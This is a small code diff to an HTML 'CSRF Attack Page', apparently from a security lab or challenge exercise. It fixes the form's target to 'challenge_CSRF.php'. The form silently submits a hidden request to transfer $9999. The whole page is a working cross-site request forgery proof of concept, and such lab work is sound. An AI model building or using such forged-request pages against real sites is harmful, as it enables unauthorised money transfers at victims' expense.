@@ -7,7 +7,7 @@
 <body>
     <h1>CSRF Attack Page</h1>
 
-    <form action="challenges_CSRF.php" method="post">
+    <form action="challenge_CSRF.php" method="post">
         <input type="hidden" name="action" value="transfer">
         <input type="hidden" name="amount" value="9999">
         <button type="submit">Transfer $9999</button>
